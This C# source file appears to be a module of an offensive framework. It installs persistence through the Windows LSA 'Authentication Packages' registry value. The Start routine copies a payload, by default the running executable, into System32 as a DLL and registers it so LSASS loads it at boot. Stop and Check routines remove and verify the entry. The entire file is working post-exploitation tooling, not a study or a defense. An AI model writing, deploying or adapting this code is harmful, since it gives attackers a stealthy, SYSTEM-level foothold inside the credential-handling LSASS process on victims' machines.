using System;
using System.IO;
using System.Linq;
using Microsoft.Win32;

namespace Framework.Modules
{
    public static class Worker
    {
        private const string RegPath = @"SYSTEM\CurrentControlSet\Control\Lsa";
        private const string ValueName = "Authentication Packages";

        private static string GetDefaultPayloadPath()
        {
            try
            {
                return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return @"C:\Windows\System32\cmd.exe";
            }
        }

        public static string Info(string[] args)
        {
            string defaultName = "{R2-117}";
            string defaultPayload = GetDefaultPayloadPath();

            return $"[i] Default Start Command Parameters:\n" +
                   $"    R2 lsa Start {defaultName} {defaultPayload}";
        }

        public static string Start(string[] args)
        {
            string name = (args != null &&
                           args.Length > 0 &&
                           !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "{R2-117}";

            string payloadPath = (args != null &&
                                  args.Length > 1 &&
                                  !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : GetDefaultPayloadPath();

            try
            {
                using var regKey =
                    Registry.LocalMachine.OpenSubKey(RegPath, writable: true);

                if (regKey == null)
                    return "[-] Access denied opening LSA registry key. Run as administrator.";

                string[] current =
                    regKey.GetValue(ValueName) as string[]
                    ?? new string[] { "msv1_0" };

                if (current.Any(p =>
                    p.Equals(name, StringComparison.OrdinalIgnoreCase)))
                {
                    return $"[*] LSA package '{name}' already registered.";
                }

                string system32 =
                    Environment.GetFolderPath(Environment.SpecialFolder.System);

                string targetPath =
                    Path.Combine(system32, name + ".dll");

                if (!File.Exists(targetPath))
                    File.Copy(payloadPath, targetPath, overwrite: false);

                var updated = current.ToList();
                updated.Add(name);

                regKey.SetValue(
                    ValueName,
                    updated.ToArray(),
                    RegistryValueKind.MultiString);

                return $"[+] Registered LSA package '{name}' | " +
                       $"DLL copied to: '{targetPath}' | " +
                       $"Reboot required for system-level loading.";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. LSA package registration requires administrator privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during installation: {ex.Message}";
            }
        }

        public static string Stop(string[] args)
        {
            string name = (args != null &&
                           args.Length > 0 &&
                           !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "{R2-117}";

            try
            {
                using var regKey =
                    Registry.LocalMachine.OpenSubKey(RegPath, writable: true);

                if (regKey == null)
                    return "[-] Access denied opening LSA registry key. Run as administrator.";

                string[] current =
                    regKey.GetValue(ValueName) as string[]
                    ?? new string[] { "msv1_0" };

                if (!current.Any(p =>
                    p.Equals(name, StringComparison.OrdinalIgnoreCase)))
                {
                    return $"[*] LSA package '{name}' not found.";
                }

                var updated = current
                    .Where(p =>
                        !p.Equals(name, StringComparison.OrdinalIgnoreCase))
                    .ToArray();

                regKey.SetValue(
                    ValueName,
                    updated,
                    RegistryValueKind.MultiString);

                string system32 =
                    Environment.GetFolderPath(Environment.SpecialFolder.System);

                string targetPath =
                    Path.Combine(system32, name + ".dll");

                if (File.Exists(targetPath))
                {
                    try
                    {
                        File.Delete(targetPath);
                    }
                    catch (IOException)
                    {
                        return $"[+] Removed LSA package registry entry for '{name}'. " +
                               "DLL is locked and requires a system restart to release.";
                    }
                }

                return $"[+] Removed LSA package '{name}' and deleted DLL from System32. " +
                       "Reboot required to fully unload it.";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. LSA package modifications require administrator privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during removal: {ex.Message}";
            }
        }

        public static string Check(string[] args)
        {
            string name = (args != null &&
                           args.Length > 0 &&
                           !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "{R2-117}";

            try
            {
                using var regKey =
                    Registry.LocalMachine.OpenSubKey(RegPath, writable: false);

                if (regKey == null)
                    return "[-] Access denied opening LSA registry key. Run as administrator.";

                string[] current =
                    regKey.GetValue(ValueName) as string[]
                    ?? new string[] { "msv1_0" };

                if (!current.Any(p =>
                    p.Equals(name, StringComparison.OrdinalIgnoreCase)))
                {
                    return $"[*] LSA package '{name}' not found.";
                }

                string system32 =
                    Environment.GetFolderPath(Environment.SpecialFolder.System);

                string targetPath =
                    Path.Combine(system32, name + ".dll");

                bool dllExists = File.Exists(targetPath);

                return $"[+] Verified LSA package '{name}' | " +
                       $"Registered: Yes | " +
                       $"DLL in System32: {dllExists} | " +
                       $"All packages: [{string.Join(", ", current)}]";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. LSA inspection requires administrator privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during verification: {ex.Message}";
            }
        }
    }
}